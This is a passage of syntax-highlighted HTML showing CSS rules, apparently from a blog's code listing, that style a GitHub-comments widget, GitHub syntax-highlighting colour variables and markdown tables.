</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">190
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">191
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">192
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">193
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">194
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">195
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">196
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">197
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">198
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">199
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">200
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">201
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">202
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">203
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">204
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">205
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">206
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">207
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">208
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">209
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">210
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">211
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">212
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">213
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">214
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">215
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">216
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">217
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">218
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">219
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">220
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">221
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">222
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">223
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">224
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">225
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">226
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">227
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">228
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">229
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">230
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">231
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">232
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">233
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">234
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">235
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">236
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">237
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">238
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">239
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">240
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">241
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">242
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">243
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">244
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">245
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-css" data-lang="css">#gh-comments-list {
  <span style="color:#ff79c6">align-items</span>: <span style="color:#ff79c6">center</span>;
  <span style="color:#ff79c6">font-size</span>: <span style="color:#bd93f9">0.8</span><span style="color:#8be9fd">rem</span>;
  <span style="color:#ff79c6">line-height</span>: <span style="color:#ff79c6">normal</span>;
}
#gh-comments {
  <span style="color:#ff79c6">text-align</span>: <span style="color:#ff79c6">center</span>;
}
#gh-comment {
  <span style="color:#ff79c6">text-align</span>: <span style="color:#ff79c6">left</span>;
  //<span style="color:#ff79c6">color</span>:<span style="color:#bd93f9">#FFF</span>;
  <span style="color:#ff79c6">color</span>: <span style="color:#ff79c6">inherit</span>;
  //<span style="color:#ff79c6">background-color</span>:<span style="color:#bd93f9">#212020</span>;
  <span style="color:#ff79c6">border</span>: <span style="color:#bd93f9">1</span><span style="color:#8be9fd">px</span> <span style="color:#ff79c6">solid</span> <span style="color:#bd93f9">#b3b3b3</span>;
  <span style="color:#ff79c6">margin</span>: <span style="color:#bd93f9">2.5</span><span style="color:#8be9fd">em</span> <span style="color:#bd93f9">0</span>;
  <span style="color:#ff79c6">padding</span>: <span style="color:#bd93f9">10</span><span style="color:#8be9fd">px</span>;
  @media (prefers-color-scheme: dark) {
    <span style="color:#ff79c6">background-color</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">#282a36</span>;
    <span style="color:#ff79c6">color</span>: <span style="color:#bd93f9">#a9a9b3</span>;
  }
}
#gh-comment-hr {
  <span style="color:#ff79c6">border-top</span>: <span style="color:#ff79c6">inset</span> <span style="color:#bd93f9">1</span><span style="color:#8be9fd">px</span> <span style="color:#ff79c6">white</span>;
  <span style="color:#ff79c6">margin</span>: <span style="color:#bd93f9">8</span><span style="color:#8be9fd">px</span> <span style="color:#bd93f9">0</span><span style="color:#8be9fd">px</span>;
}
#gh-comment <span style="color:#ff79c6">p</span> {
  <span style="color:#ff79c6">margin</span>: <span style="color:#bd93f9">0</span><span style="color:#8be9fd">px</span>;
  <span style="color:#ff79c6">font-size</span>: <span style="color:#bd93f9">0.8</span><span style="color:#8be9fd">em</span>;
}
#gh-comment <span style="color:#ff79c6">img</span> {
  <span style="color:#ff79c6">display</span>: <span style="color:#ff79c6">inline</span>;
  <span style="color:#ff79c6">vertical-align</span>: <span style="color:#ff79c6">middle</span>;
  <span style="color:#ff79c6">margin</span>: <span style="color:#bd93f9">2</span><span style="color:#8be9fd">px</span> <span style="color:#bd93f9">10</span><span style="color:#8be9fd">px</span> <span style="color:#bd93f9">2</span><span style="color:#8be9fd">px</span> <span style="color:#bd93f9">2</span><span style="color:#8be9fd">px</span>;
}
<span style="color:#6272a4">/* GITHUB */</span>
:root {
  <span style="color:#8be9fd;font-style:italic">--color-markdown-table-border</span>: <span style="color:#bd93f9">#959da5</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-comment</span>: <span style="color:#bd93f9">#6272a4</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-constant</span>: <span style="color:#bd93f9">#ff79c6</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-entity</span>: <span style="color:#bd93f9">#50fa7b</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-storage-modifier-import</span>: <span style="color:#bd93f9">#ddd</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-entity-tag</span>: <span style="color:#bd93f9">#22863a</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-keyword</span>: <span style="color:#bd93f9">#ff79c6</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-string</span>: <span style="color:#bd93f9">#f1fa8c</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-variable</span>: <span style="color:#bd93f9">#e36209</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-brackethighlighter-unmatched</span>: <span style="color:#bd93f9">#b31d28</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-invalid-illegal-text</span>: <span style="color:#bd93f9">#fafbfc</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-invalid-illegal-bg</span>: <span style="color:#bd93f9">#b31d28</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-carriage-return-text</span>: <span style="color:#bd93f9">#fafbfc</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-carriage-return-bg</span>: <span style="color:#bd93f9">#d73a49</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-string-regexp</span>: <span style="color:#bd93f9">#22863a</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-markup-list</span>: <span style="color:#bd93f9">#735c0f</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-markup-heading</span>: <span style="color:#bd93f9">#005cc5</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-markup-italic</span>: <span style="color:#bd93f9">#24292e</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-markup-bold</span>: <span style="color:#bd93f9">#24292e</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-markup-deleted-text</span>: <span style="color:#bd93f9">#b31d28</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-markup-deleted-bg</span>: <span style="color:#bd93f9">#ffeef0</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-markup-inserted-text</span>: <span style="color:#bd93f9">#22863a</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-markup-inserted-bg</span>: <span style="color:#bd93f9">#f0fff4</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-markup-changed-text</span>: <span style="color:#bd93f9">#e36209</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-markup-changed-bg</span>: <span style="color:#bd93f9">#ffebda</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-markup-ignored-text</span>: <span style="color:#bd93f9">#f6f8fa</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-markup-ignored-bg</span>: <span style="color:#bd93f9">#005cc5</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-meta-diff-range</span>: <span style="color:#bd93f9">#6f42c1</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-brackethighlighter-angle</span>: <span style="color:#bd93f9">#586069</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-sublimelinter-gutter-mark</span>: <span style="color:#bd93f9">#959da5</span>;
  <span style="color:#8be9fd;font-style:italic">--color-prettylights-syntax-constant-other-reference-link</span>: <span style="color:#bd93f9">#032f62</span>;
}
.<span style="color:#50fa7b">pl-c</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>comment);
}
.<span style="color:#50fa7b">pl-c1</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">pl-s</span> .<span style="color:#50fa7b">pl-v</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>constant);
}
.<span style="color:#50fa7b">pl-e</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">pl-en</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>entity);
}
.<span style="color:#50fa7b">pl-s</span> .<span style="color:#50fa7b">pl-s1</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">pl-smi</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>storage<span style="color:#ff79c6">-</span>modifier<span style="color:#ff79c6">-</span>import);
}
.<span style="color:#50fa7b">pl-ent</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>entity<span style="color:#ff79c6">-</span>tag);
}
.<span style="color:#50fa7b">pl-k</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>keyword);
}
.<span style="color:#50fa7b">pl-pds</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">pl-s</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">pl-s</span> .<span style="color:#50fa7b">pl-pse</span> .<span style="color:#50fa7b">pl-s1</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">pl-sr</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">pl-sr</span> .<span style="color:#50fa7b">pl-cce</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">pl-sr</span> .<span style="color:#50fa7b">pl-sra</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">pl-sr</span> .<span style="color:#50fa7b">pl-sre</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>string);
}
.<span style="color:#50fa7b">pl-smw</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">pl-v</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>variable);
}
.<span style="color:#50fa7b">pl-bu</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>brackethighlighter<span style="color:#ff79c6">-</span>unmatched);
}
.<span style="color:#50fa7b">pl-ii</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>invalid<span style="color:#ff79c6">-</span>illegal<span style="color:#ff79c6">-</span><span style="color:#ff79c6">text</span>);
  <span style="color:#ff79c6">background-color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>invalid<span style="color:#ff79c6">-</span>illegal<span style="color:#ff79c6">-</span>bg);
}
.<span style="color:#50fa7b">pl-c2</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>carriage<span style="color:#ff79c6">-</span>return<span style="color:#ff79c6">-</span><span style="color:#ff79c6">text</span>);
  <span style="color:#ff79c6">background-color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>carriage<span style="color:#ff79c6">-</span>return<span style="color:#ff79c6">-</span>bg);
}
.<span style="color:#50fa7b">pl-c2</span>:before {
  <span style="color:#ff79c6">content</span>: <span style="color:#f1fa8c">&#34;^M&#34;</span>;
}
.<span style="color:#50fa7b">pl-sr</span> .<span style="color:#50fa7b">pl-cce</span> {
  <span style="color:#ff79c6">font-weight</span>: <span style="color:#bd93f9">700</span>;
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>string<span style="color:#ff79c6">-</span>regexp);
}
.<span style="color:#50fa7b">pl-ml</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>markup<span style="color:#ff79c6">-</span>list);
}
.<span style="color:#50fa7b">pl-mh</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">pl-mh</span> .<span style="color:#50fa7b">pl-en</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">pl-ms</span> {
  <span style="color:#ff79c6">font-weight</span>: <span style="color:#bd93f9">700</span>;
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>markup<span style="color:#ff79c6">-</span>heading);
}
.<span style="color:#50fa7b">pl-mi</span> {
  <span style="color:#ff79c6">font-style</span>: <span style="color:#ff79c6">italic</span>;
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>markup<span style="color:#ff79c6">-</span><span style="color:#ff79c6">italic</span>);
}
.<span style="color:#50fa7b">pl-mb</span> {
  <span style="color:#ff79c6">font-weight</span>: <span style="color:#bd93f9">700</span>;
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>markup<span style="color:#ff79c6">-</span><span style="color:#ff79c6">bold</span>);
}
.<span style="color:#50fa7b">pl-md</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>markup<span style="color:#ff79c6">-</span>deleted<span style="color:#ff79c6">-</span><span style="color:#ff79c6">text</span>);
  <span style="color:#ff79c6">background-color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>markup<span style="color:#ff79c6">-</span>deleted<span style="color:#ff79c6">-</span>bg);
}
.<span style="color:#50fa7b">pl-mi1</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>markup<span style="color:#ff79c6">-</span>inserted<span style="color:#ff79c6">-</span><span style="color:#ff79c6">text</span>);
  <span style="color:#ff79c6">background-color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>markup<span style="color:#ff79c6">-</span>inserted<span style="color:#ff79c6">-</span>bg);
}
.<span style="color:#50fa7b">pl-mc</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>markup<span style="color:#ff79c6">-</span>changed<span style="color:#ff79c6">-</span><span style="color:#ff79c6">text</span>);
  <span style="color:#ff79c6">background-color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>markup<span style="color:#ff79c6">-</span>changed<span style="color:#ff79c6">-</span>bg);
}
.<span style="color:#50fa7b">pl-mi2</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>markup<span style="color:#ff79c6">-</span>ignored<span style="color:#ff79c6">-</span><span style="color:#ff79c6">text</span>);
  <span style="color:#ff79c6">background-color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>markup<span style="color:#ff79c6">-</span>ignored<span style="color:#ff79c6">-</span>bg);
}
.<span style="color:#50fa7b">pl-mdr</span> {
  <span style="color:#ff79c6">font-weight</span>: <span style="color:#bd93f9">700</span>;
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>meta<span style="color:#ff79c6">-</span>diff<span style="color:#ff79c6">-</span>range);
}
.<span style="color:#50fa7b">pl-ba</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>brackethighlighter<span style="color:#ff79c6">-</span>angle);
}
.<span style="color:#50fa7b">pl-sg</span> {
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>sublimelinter<span style="color:#ff79c6">-</span>gutter<span style="color:#ff79c6">-</span>mark);
}
.<span style="color:#50fa7b">pl-corl</span> {
  <span style="color:#ff79c6">text-decoration</span>: <span style="color:#ff79c6">underline</span>;
  <span style="color:#ff79c6">color</span>: <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>prettylights<span style="color:#ff79c6">-</span>syntax<span style="color:#ff79c6">-</span>constant<span style="color:#ff79c6">-</span>other<span style="color:#ff79c6">-</span>reference<span style="color:#ff79c6">-</span>link);
}

.<span style="color:#50fa7b">markdown-body</span> <span style="color:#ff79c6">table</span> <span style="color:#ff79c6">td</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">markdown-body</span> <span style="color:#ff79c6">table</span> <span style="color:#ff79c6">th</span> {
  <span style="color:#ff79c6">padding</span>: <span style="color:#bd93f9">6</span><span style="color:#8be9fd">px</span> <span style="color:#bd93f9">13</span><span style="color:#8be9fd">px</span>;
  <span style="color:#ff79c6">border</span>: <span style="color:#bd93f9">1</span><span style="color:#8be9fd">px</span> <span style="color:#ff79c6">solid</span> <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>markdown<span style="color:#ff79c6">-</span><span style="color:#ff79c6">table</span><span style="color:#ff79c6">-</span>border);
}
.<span style="color:#50fa7b">markdown-body</span> <span style="color:#ff79c6">table</span> <span style="color:#ff79c6">th</span> {
  <span style="color:#ff79c6">font-weight</span>: <span style="color:#bd93f9">600</span>;
}

#gh-comment <span style="color:#ff79c6">table</span> {
  <span style="color:#ff79c6">border-collapse</span>: <span style="color:#ff79c6">collapse</span>;
  <span style="color:#ff79c6">border-spacing</span>: <span style="color:#bd93f9">0</span>;
  <span style="color:#ff79c6">border</span>: <span style="color:#bd93f9">1</span><span style="color:#8be9fd">px</span> <span style="color:#ff79c6">solid</span> <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>markdown<span style="color:#ff79c6">-</span><span style="color:#ff79c6">table</span><span style="color:#ff79c6">-</span>border);
  margin-block-end: <span style="color:#bd93f9">10</span><span style="color:#8be9fd">px</span>;
}
#gh-comment <span style="color:#ff79c6">table</span> <span style="color:#ff79c6">thead</span><span style="color:#ff79c6">,</span>
#gh-comment <span style="color:#ff79c6">table</span> <span style="color:#ff79c6">tbody</span> {
  <span style="color:#ff79c6">border-collapse</span>: <span style="color:#ff79c6">collapse</span>;
}
#gh-comment <span style="color:#ff79c6">table</span> <span style="color:#ff79c6">td</span><span style="color:#ff79c6">,</span>
#gh-comment <span style="color:#ff79c6">table</span> <span style="color:#ff79c6">th</span> {
  <span style="color:#ff79c6">padding</span>: <span style="color:#bd93f9">6</span><span style="color:#8be9fd">px</span> <span style="color:#bd93f9">13</span><span style="color:#8be9fd">px</span>;
  <span style="color:#ff79c6">border-spacing</span>: <span style="color:#bd93f9">0</span>;
  <span style="color:#ff79c6">border-collapse</span>: <span style="color:#ff79c6">collapse</span>;
  <span style="color:#ff79c6">border</span>: <span style="color:#bd93f9">1</span><span style="color:#8be9fd">px</span> <span style="color:#ff79c6">solid</span> <span style="color:#50fa7b">var</span>(<span style="color:#ff79c6">--</span><span style="color:#ff79c6">color</span><span style="color:#ff79c6">-</span>markdown<span style="color:#ff79c6">-</span><span style="color:#ff79c6">table</span><span style="color:#ff79c6">-</span>border);
}
.<span style="color:#50fa7b">markdown-body</span> <span style="color:#ff79c6">table</span> <span style="color:#ff79c6">td</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">markdown-body</span> <span style="color:#ff79c6">table</span> <span style="color:#ff79c6">th</span> {
  <span style="color:#ff79c6">padding</span>: <span style="color:#bd93f9">6</span><span style="color:#8be9fd">px</span> <span style="color:#bd93f9">13</span><span style="color:#8be9fd">px</span>;
  <span style="color:#ff79c6">border</span>: <span style="color:#bd93f9">1</span><span style="color:#8be9fd">px</span> <span style="color:#ff79c6">solid</span> <span style="color:#ff79c6">white</span>;
}
.<span style="color:#50fa7b">markdown-body</span> <span style="color:#ff79c6">table</span> <span style="color:#ff79c6">th</span> {
  <span style="color:#ff79c6">font-weight</span>: <span style="color:#bd93f9">600</span>;
}
.<span style="color:#50fa7b">markdown-body</span> .<span style="color:#50fa7b">highlight</span> <span style="color:#ff79c6">pre</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">markdown-body</span> <span style="color:#ff79c6">pre</span> {
  <span style="color:#ff79c6">font-size</span>: <span style="color:#bd93f9">85</span><span style="color:#8be9fd">%</span>;
  <span style="color:#ff79c6">line-height</span>: <span style="color:#bd93f9">1.45</span>;
}
.<span style="color:#50fa7b">markdown-body</span> .<span style="color:#50fa7b">highlight</span> <span style="color:#ff79c6">pre</span> {
  <span style="color:#ff79c6">word-break</span>: <span style="color:#ff79c6">normal</span>;
}
.<span style="color:#50fa7b">markdown-body</span> .<span style="color:#50fa7b">highlight</span> <span style="color:#ff79c6">pre</span><span style="color:#ff79c6">,</span>
.<span style="color:#50fa7b">markdown-body</span> <span style="color:#ff79c6">pre</span> {
  <span style="color:#ff79c6">font-size</span>: <span style="color:#bd93f9">85</span><span style="color:#8be9fd">%</span>;
  <span style="color:#ff79c6">line-height</span>: <span style="color:#bd93f9">1.45</span>;
}
